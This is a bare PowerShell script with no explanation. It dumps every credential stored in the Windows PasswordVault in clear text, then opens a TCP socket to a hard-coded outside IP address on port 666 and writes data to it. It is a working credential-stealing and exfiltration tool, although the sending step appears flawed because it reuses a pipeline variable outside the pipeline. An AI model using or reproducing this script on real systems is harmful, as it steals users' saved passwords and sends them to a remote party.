[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] 
(new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
$port=666
$remoteHost = "209.151.149.234"
$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
$data = [System.Text.Encoding]::ASCII.GetBytes($_)
$stream = $socket.GetStream()
$stream.Write($data, 0, $data.Length)
